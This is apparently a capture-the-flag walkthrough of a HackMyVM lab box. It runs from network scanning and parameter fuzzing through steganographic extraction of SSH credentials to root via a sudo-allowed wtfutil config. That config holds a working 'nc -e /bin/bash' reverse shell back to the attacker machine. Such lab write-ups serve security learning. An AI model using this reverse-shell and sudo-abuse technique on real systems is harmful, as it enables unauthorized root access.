
## Enumeration

Find IP address

```
sudo arp-scan -l
[sudo] password for kali: 
Interface: eth0, type: EN10MB, MAC: bc:24:11:77:ec:ed, IPv4: 192.168.2.4
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.2.1	24:bb:c9:19:98:a5	(Unknown)
192.168.2.2	48:2a:e3:2c:0c:31	Wistron InfoComm(Kunshan)Co.,Ltd.
192.168.2.10	f8:bc:12:7f:7b:5a	Dell Inc.
192.168.2.20	bc:24:11:e9:c4:98	(Unknown)
192.168.2.125	08:00:27:03:d5:a7	PCS Systemtechnik GmbH

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.084 seconds (122.84 hosts/sec). 5 responded

```

Ip address = 192.168.2.125

edit /etc/hosts file

#### Nmap scan

```
 nmap -p- -sV -sC art.lan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 02:18 EST
Nmap scan report for art.lan (192.168.2.125)
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 45:42:0f:13:cc:8e:49:dd:ec:f5:bb:0f:58:f4:ef:47 (RSA)
|   256 12:2f:a3:63:c2:73:99:e3:f8:67:57:ab:29:52:aa:06 (ECDSA)
|_  256 f8:79:7a:b1:a8:7e:e9:97:25:c3:40:4a:0c:2f:5e:69 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0
MAC Address: 08:00:27:03:D5:A7 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.95 seconds


```

web server enum


```
curl http://art.lan
SEE HMV GALLERY!
<br>
 <img src=abc321.jpg><br><img src=jlk19990.jpg><br><img src=ertye.jpg><br><img src=zzxxccvv3.jpg><br>
<!-- Need to solve tag parameter problem. -->

```

4 images 

and a note 
Need to solve tag parameter problem. 

fuzzed 

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://art.lan/index.php?FUZZ=something -fs 170

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://art.lan/index.php?FUZZ=something
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 170
________________________________________________

tag                     [Status: 200, Size: 70, Words: 11, Lines: 5, Duration: 25ms]

```

fuzzing again

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://art.lan/index.php?tag=FUZZ -fs 70,170

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://art.lan/index.php?tag=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 70,170
________________________________________________

beauty                  [Status: 200, Size: 93, Words: 12, Lines: 5, Duration: 20ms]

```

```
curl http://art.lan/index.php?tag=beauty
SEE HMV GALLERY!
<br>
 <img src=dsa32.jpg><br>
<!-- Need to solve tag parameter problem. -->

```

Another image

```
stegseek dsa32.jpg                             
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "yes.txt".
[i] Extracting to "dsa32.jpg.out".


 cat dsa32.jpg.out 
lion/shel0vesyou

```


seems like credentials 

```
ssh lion@art.lan  
The authenticity of host 'art.lan (192.168.2.125)' can't be established.
ED25519 key fingerprint is SHA256:6icD/Bw7zNCkO/tjgVhzyYMGZkZVKkOvOlpNVvcBQo0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'art.lan' (ED25519) to the list of known hosts.
lion@art.lan's password: 
Linux art 5.10.0-16-amd64 #1 SMP Debian 5.10.127-2 (2022-07-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Aug  3 11:18:18 2022 from 192.168.1.51
lion@art:~$ 

```

We got Shell!

```
lion@art:~$ cat user.txt 
HMVygUmTyvRPWduINKYfmpO
lion@art:~$ 

```
user flag


### Local Priv Esc


```
sudo -l
Matching Defaults entries for lion on art:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User lion may run the following commands on art:
    (ALL : ALL) NOPASSWD: /bin/wtfutil

```



create config.yml file
```
lion@art:/tmp$ cat config.yml 
wtf:
  grid:
    columns: [40, 40]
    rows: [4, 4]
  refreshInterval: 1
  mods:
    disks:
      type: cmdrunner
      cmd: "nc"
      args: ["-e", "/bin/bash", "192.168.2.4", "8888"]
      enabled: true
      position:
        top: 3
        left: 1
        height: 1
        width: 3
      refreshInterval: 3

```

listen on attack machine

```
 sudo -u root wtfutil --config=./config.yml
```

root flag

```
nc -lnvp 8888
Listening on 0.0.0.0 8888
Connection received on 192.168.2.125 50738
whoami
root
cat /var/opt/root.txt
mZxbPCjEQYOqkNCuyIuTHMV



```